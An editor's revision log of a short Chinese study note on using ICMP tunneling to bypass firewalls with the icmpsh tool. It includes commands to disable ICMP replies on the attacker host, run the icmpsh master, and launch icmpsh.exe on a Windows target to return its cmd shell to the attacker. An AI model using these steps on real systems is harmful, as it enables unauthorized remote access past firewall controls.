{"compress":true,"commitItems":[["ce803712-8d8e-4b00-9e53-08521dc44056",1585106791091,"",[[1585106740177,["whale@Whale",[[1,0,"icmp隧道\n===\n\n\n"]],[0,0],[13,13]]],[1585106748036,["whale@Whale",[[-1,12,"\n"],[1,13,"m"]],[13,13],[12,13]]],[1585106748175,["whale@Whale",[[1,13,"u"]],[12,13],[12,14]]],[1585106748436,["whale@Whale",[[1,14,"'d"]],[12,14],[12,16]]],[1585106748544,["whale@Whale",[[1,16,"i"]],[12,16],[12,17]]],[1585106748790,["whale@Whale",[[-1,12,"mu'di"],[1,17,"目的"]],[12,17],[12,14]]],[1585106756795,["whale@Whale",[[1,14,"是当有防火墙只允许0"]],[14,14],[24,24]]],[1585106757295,["whale@Whale",[[-1,23,"0"]],[24,24],[23,23]]],[1585106766061,["whale@Whale",[[1,23,"80、443等常见端口的"]],[23,23],[35,35]]],[1585106783411,["whale@Whale",[[-1,34,"的"]],[35,35],[34,34]]],[1585106790611,["whale@Whale",[[1,34,"或常见的"]],[34,34],[38,38]]],[1585106806249,["whale@Whale",[[1,38,"数据包协议的时候，过滤"]],[38,38],[49,49]]],[1585106812121,["whale@Whale",[[-1,12,"目的是"]],[15,15],[12,12]]],[1585106815888,["whale@Whale",[[1,46,"掉"]],[46,46],[47,47]]],[1585106818243,["whale@Whale",[[-1,44,"过滤掉"]],[47,47],[44,44]]],[1585106842018,["whale@Whale",[[1,44,"其他类型的数据包和不允许访问的端口就会被过滤。"]],[44,44],[67,67]]],[1585106842313,["whale@Whale",[[1,67,"\n\n"]],[67,67],[68,68]]],[1585106842720,["whale@Whale",[[1,69,"\n"]],[68,68],[69,69]]],[1585107010725,["whale@Whale",[[-1,69,"\n"],[1,70,"icmp隧道就是将其他"]],[69,69],[80,80]]],[1585107012158,["whale@Whale",[[-1,78,"其他"]],[80,80],[78,78]]],[1585107023517,["whale@Whale",[[1,78,"不被允许的数据包进行封装"]],[78,78],[90,90]]],[1585107025654,["whale@Whale",[[-1,86,"进行封装"]],[90,90],[86,86]]],[1585107030891,["whale@Whale",[[1,86,"使用icmp协议"]],[86,86],[94,94]]],[1585107037907,["whale@Whale",[[1,94,"进行封装，"]],[94,94],[99,99]]],[1585107190328,["whale@Whale",[[-1,98,"，"]],[99,99],[98,98]]],[1585107204834,["whale@Whale",[[1,98,"。同理可得，除了icmp隧道，还有"]],[98,98],[115,115]]],[1585107206370,["whale@Whale",[[-1,114,"有"]],[115,115],[114,114]]],[1585107211063,["whale@Whale",[[1,114,"可以使用其他类型的"]],[114,114],[123,123]]],[1585107213634,["whale@Whale",[[1,123,"协议，"]],[123,123],[126,126]]],[1585107215077,["whale@Whale",[[-1,125,"，"]],[126,126],[125,125]]],[1585107222647,["whale@Whale",[[1,125,"，例如IPv6\\"]],[125,125],[133,133]]],[1585107223122,["whale@Whale",[[-1,132,"\\"]],[133,133],[132,132]]],[1585107223531,["whale@Whale",[[1,132,"、"]],[132,132],[133,133]]],[1585107261590,["whale@Whale",[[-1,132,"、"]],[133,133],[132,132]]],[1585107266608,["whale@Whale",[[1,132,"、TCP"]],[132,132],[136,136]]],[1585107273322,["whale@Whale",[[1,136,"\\"]],[136,136],[137,137]]],[1585107274070,["whale@Whale",[[-1,136,"\\"]],[137,137],[136,136]]],[1585107276967,["whale@Whale",[[1,136,"、UDPd"]],[136,136],[141,141]]],[1585107277432,["whale@Whale",[[-1,140,"d"]],[141,141],[140,140]]],[1585107279108,["whale@Whale",[[1,140,"等等。"]],[140,140],[143,143]]],[1585107279572,["whale@Whale",[[1,143,"\n\n"]],[143,143],[144,144]]],[1585107279788,["whale@Whale",[[1,145,"\n"]],[144,144],[145,145]]],[1585107479625,["whale@Whale",[[1,145,"[https://github.com/DhavalKapil/icmptunnel](https://github.com/DhavalKapil/icmptunnel)"]],[145,145],[231,231]]],[1585108141931,["whale@Whale",[[1,232,"\n"]],[231,231],[232,232]]],[1585108142131,["whale@Whale",[[1,233,"\n"]],[232,232],[233,233]]],[1585108143017,["whale@Whale",[[1,233,"```\n./icmptunnel -s 10.0.1.1\n```"]],[233,233],[265,265]]],[1585108157849,["whale@Whale",[[-1,254,"0.0"],[1,257,"92.168"],[1,259,"68"],[1,261,"09"]],[253,261],[268,268]]],[1585111159086,["whale@Whale",[[1,273,"\n"]],[272,272],[273,273]]],[1585111159923,["whale@Whale",[[1,273,"sysctl -w net/ipv4/icmp_echo_ignore_all=1"]],[273,273],[314,314]]],[1585113402722,["whale@Whale",[[-1,269,"```"]],[269,272],[269,269]]],[1585113404965,["whale@Whale",[[1,312,"\n"]],[311,311],[312,312]]],[1585113405183,["whale@Whale",[[1,313,"\n"]],[312,312],[313,313]]],[1585113405602,["whale@Whale",[[1,313,"```"]],[313,313],[316,316]]],[1585113439528,["whale@Whale",[[1,270,"\n"]],[269,269],[270,270]]],[1585113442614,["whale@Whale",[[1,270,"关闭"]],[270,270],[272,272]]],[1585113445749,["whale@Whale",[[-1,270,"关闭"]],[272,272],[270,270]]],[1585113445904,["whale@Whale",[[-1,270,"\n"]],[270,270],[269,269]]],[1585113446648,["whale@Whale",[[1,270,"\n"]],[269,269],[270,270]]],[1585113458072,["whale@Whale",[[1,270,"在攻击机上运行该命令，关闭icmp请求应答"]],[270,270],[291,291]]],[1585113464397,["whale@Whale",[[-1,145,"[https://github.com/DhavalKapil/icmptunnel](https://github.com/DhavalKapil/icmptunnel)"]],[145,231],[145,145]]],[1585113467567,["whale@Whale",[[-1,151,"./icmptunnel -s 192.168.168.109\n"]],[151,183],[151,151]]],[1585113468018,["whale@Whale",[[-1,151,"\n"]],[151,151],[150,150]]],[1585113490214,["whale@Whale",[[1,145,"[https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)"]],[145,145],[215,215]]],[1585113491525,["whale@Whale",[[1,217,"\n"]],[215,215],[216,216]]],[1585113493278,["whale@Whale",[[1,216,"这个是"]],[216,216],[219,219]]],[1585113494287,["whale@Whale",[[-1,217,"个是"]],[219,219],[217,217]]],[1585113496998,["whale@Whale",[[1,217,"是一个使用"]],[217,217],[222,222]]],[1585113505442,["whale@Whale",[[1,222,"icmp隧道的工具，将"]],[222,222],[233,233]]],[1585113506468,["whale@Whale",[[-1,232,"将"]],[233,233],[232,232]]],[1585113514990,["whale@Whale",[[1,232,"可以将内网机器与攻击机器"]],[232,232],[244,244]]],[1585113515152,["whale@Whale",[[-1,243,"器"]],[244,244],[243,243]]],[1585113520488,["whale@Whale",[[1,243,"进行联通。"]],[243,243],[248,248]]],[1585113523862,["whale@Whale",[[-1,245,"联通"]],[247,247],[245,245]]],[1585113526759,["whale@Whale",[[1,245,"连接"]],[245,245],[247,247]]],[1585113619148,["whale@Whale",[[1,323,"\n"]],[322,322],[323,323]]],[1585113642375,["whale@Whale",[[1,318,"---"]],[318,318],[321,321]]],[1585113642604,["whale@Whale",[[1,322,"\n"]],[321,321],[322,322]]],[1585113642972,["whale@Whale",[[1,323,"\n"]],[322,322],[323,323]]],[1585113645373,["whale@Whale",[[1,323,"git clone [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)"]],[323,323],[403,403]]],[1585113650237,["whale@Whale",[[-1,367,"](https://github.com/inquisb/icmpsh)"]],[368,403],[367,367]]],[1585113651414,["whale@Whale",[[-1,333,"["]],[334,334],[333,333]]],[1585113653176,["whale@Whale",[[1,367,"\n"]],[366,366],[367,367]]],[1585113655113,["whale@Whale",[[1,367,"cd im"]],[367,367],[372,372]]],[1585113655690,["whale@Whale",[[-1,371,"m"]],[372,372],[371,371]]],[1585113656726,["whale@Whale",[[1,371,"cmpsh"]],[371,371],[376,376]]],[1585113657150,["whale@Whale",[[1,377,"\n"]],[376,376],[377,377]]],[1585113659276,["whale@Whale",[[1,377,"./run.sh"]],[377,377],[385,385]]],[1585114207783,["whale@Whale",[[-1,390,"\n"],[1,391,"zai"]],[390,390],[393,393]]],[1585114208214,["whale@Whale",[[-1,391,"ai"]],[393,393],[391,391]]],[1585114208388,["whale@Whale",[[-1,390,"z"],[1,391,"\n"]],[391,391],[390,390]]],[1585114217320,["whale@Whale",[[-1,390,"\n"],[1,391,"在目标机器上运行"]],[390,390],[398,398]]],[1585114219325,["whale@Whale",[[1,398,"一下"]],[398,398],[400,400]]],[1585114219966,["whale@Whale",[[-1,398,"一下"]],[400,400],[398,398]]],[1585114221781,["whale@Whale",[[1,398,"以下命令"]],[398,398],[402,402]]],[1585114222745,["whale@Whale",[[1,402,"\n\nicmpsh.exe -t  -d 500 -b 30 -s 128\r\n"]],[402,402],[439,439]]],[1585114231118,["whale@Whale",[[1,417,"1"],[-1,437,"\r"]],[417,417],[418,418]]],[1585114235593,["whale@Whale",[[1,418,"92.168.1.1"]],[418,418],[428,428]]],[1585114238688,["whale@Whale",[[-1,427,"1"]],[428,428],[427,427]]],[1585114240278,["whale@Whale",[[1,427,"x"]],[427,427],[428,428]]]]],["4b4800b2-3f1f-4419-a6d2-372d3cbe902b",1585142869978,"icmp隧道\n===\n\n当有防火墙只允许80、443等常见端口或常见的数据包协议的时候，其他类型的数据包和不允许访问的端口就会被过滤。\n\nicmp隧道就是将不被允许的数据包使用icmp协议进行封装。同理可得，除了icmp隧道，还可以使用其他类型的协议，例如IPv6、TCP、UDP等等。\n\n[https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)\n这是一个使用icmp隧道的工具，可以将内网机器与攻击机进行连接。\n\n```\n在攻击机上运行该命令，关闭icmp请求应答\nsysctl -w net/ipv4/icmp_echo_ignore_all=1\n---\n\ngit clone https://github.com/inquisb/icmpsh\ncd icmpsh\n./run.sh\n```\n在目标机器上运行以下命令\nicmpsh.exe -t 192.168.1.x -d 500 -b 30 -s 128\n\n",[[1585142834036,["whale@Whale",[[-1,377,"./run.sh"],[1,385,"p"]],[377,385],[377,378]]],[1585142834222,["whale@Whale",[[1,378,"'y"]],[377,378],[377,380]]],[1585142834341,["whale@Whale",[[1,380,"'t"]],[377,380],[377,382]]],[1585142834538,["whale@Whale",[[-1,378,"'"],[-1,380,"'"],[1,382,"h"]],[377,382],[377,381]]],[1585142834642,["whale@Whale",[[1,381,"o"]],[377,381],[377,382]]],[1585142834801,["whale@Whale",[[1,382,"n"]],[377,382],[377,383]]],[1585142836008,["whale@Whale",[[1,383," icmpsh_m.py "]],[383,383],[396,396]]],[1585142923854,["whale@Whale",[[1,396,"go"]],[396,396],[398,398]]],[1585142924423,["whale@Whale",[[-1,396,"go"]],[398,398],[396,396]]],[1585142927890,["whale@Whale",[[1,396,"攻击机器"]],[396,396],[400,400]]],[1585142928041,["whale@Whale",[[-1,399,"器"]],[400,400],[399,399]]],[1585142929741,["whale@Whale",[[1,399,"IP "]],[399,399],[402,402]]],[1585142933228,["whale@Whale",[[1,402,"受害机器ip"]],[402,402],[408,408]]],[1585142988894,["whale@Whale",[[-1,440,"192.168.1.x"],[1,451,"gong"]],[440,451],[444,444]]],[1585142989765,["whale@Whale",[[-1,440,"gong"]],[444,444],[440,440]]],[1585142992192,["whale@Whale",[[1,440,"攻击机器"]],[440,440],[444,444]]],[1585142992354,["whale@Whale",[[-1,443,"器"]],[444,444],[443,443]]],[1585142993154,["whale@Whale",[[1,443,"ip"]],[443,443],[445,445]]],[1585143127348,["whale@Whale",[[1,6,"ra"]],[6,6],[8,8]]],[1585143127926,["whale@Whale",[[-1,6,"ra"]],[8,8],[6,6]]],[1585143131528,["whale@Whale",[[1,6,"绕过防火墙"]],[6,6],[11,11]]],[1585143145076,["whale@Whale",[[1,431,"·"]],[431,431],[432,432]]],[1585143146181,["whale@Whale",[[-1,431,"·"]],[432,432],[431,431]]],[1585143146649,["whale@Whale",[[1,431,"`"]],[431,431],[432,432]]],[1585143147257,["whale@Whale",[[1,471,"`"]],[471,471],[472,472]]],[1585143149805,["whale@Whale",[[1,474,"\n"]],[472,472],[473,473]]],[1585143150054,["whale@Whale",[[1,475,"\n"]],[473,473],[474,474]]],[1585143151159,["whale@Whale",[[1,474,"ci"]],[474,474],[476,476]]],[1585143151777,["whale@Whale",[[-1,474,"ci"]],[476,476],[474,474]]],[1585143158630,["whale@Whale",[[1,474,"此时攻击机器"]],[474,474],[480,480]]],[1585143158793,["whale@Whale",[[-1,479,"器"]],[480,480],[479,479]]],[1585143159801,["whale@Whale",[[1,479,"ip"]],[479,479],[481,481]]],[1585143160223,["whale@Whale",[[-1,479,"ip"]],[481,481],[479,479]]],[1585143164003,["whale@Whale",[[1,479,"就会返回"]],[479,479],[483,483]]],[1585143169410,["whale@Whale",[[-1,481,"返回"]],[483,483],[481,481]]],[1585143177422,["whale@Whale",[[1,481,"返回受害机器的cmd shell，"]],[481,481],[498,498]]],[1585143177979,["whale@Whale",[[-1,497,"，"]],[498,498],[497,497]]],[1585143178342,["whale@Whale",[[1,497,"，"]],[497,497],[498,498]]],[1585143180374,["whale@Whale",[[-1,497,"，"]],[498,498],[497,497]]],[1585143184462,["whale@Whale",[[1,497,"。该机器"]],[497,497],[501,501]]],[1585143495616,["whale@Whale",[[1,498,"\n"]],[498,498],[499,499]]],[1585143495784,["whale@Whale",[[1,499,"\n"]],[499,499],[500,500]]],[1585143515343,["whale@Whale",[[1,503,"缺点是目标机器只能运行在"]],[503,503],[515,515]]],[1585143521218,["whale@Whale",[[-1,500,"该机器"]],[503,503],[500,500]]],[1585143525393,["whale@Whale",[[1,500,"icmpsh"]],[500,500],[506,506]]],[1585143529753,["whale@Whale",[[-1,517,"在"]],[518,518],[517,517]]],[1585143530767,["whale@Whale",[[-1,513,"只能运行"]],[517,517],[513,513]]],[1585143532295,["whale@Whale",[[1,513,"zhi"]],[513,513],[516,516]]],[1585143533199,["whale@Whale",[[-1,513,"zhi"]],[516,516],[513,513]]],[1585143546670,["whale@Whale",[[1,513,"只能是windows，无法在受害机器"]],[513,513],[531,531]]],[1585143549121,["whale@Whale",[[-1,523,"，无法在受害机器"]],[531,531],[523,523]]],[1585143550114,["whale@Whale",[[1,523,"。"]],[523,523],[524,524]]],[1585143550591,["whale@Whale",[[-1,523,"。"]],[524,524],[523,523]]],[1585143551917,["whale@Whale",[[1,523,"，如果"]],[523,523],[526,526]]],[1585143552998,["whale@Whale",[[-1,523,"，如果"]],[526,526],[523,523]]],[1585143560126,["whale@Whale",[[1,523,"。如果目标机器是linux"]],[523,523],[536,536]]],[1585143560932,["whale@Whale",[[-1,533,"nux"]],[536,536],[533,533]]],[1585143572468,["whale@Whale",[[1,533,"nux系统，那么就要用其他办法绕过防火墙。"]],[533,533],[554,554]]],[1585143587215,["whale@Whale",[[1,509,"只能运行在"]],[509,509],[514,514]]],[1585143593466,["whale@Whale",[[-1,518,"只能是"]],[521,521],[518,518]]],[1585143594408,["whale@Whale",[[1,518,"是"]],[518,518],[519,519]]],[1585143600565,["whale@Whale",[[1,526,"的系统上"]],[526,526],[530,530]]],[1585144585990,["whale@Whale",[[-1,0,"icmp隧道绕过防火墙\n===\n"]],[0,11],[0,0]]]]]]}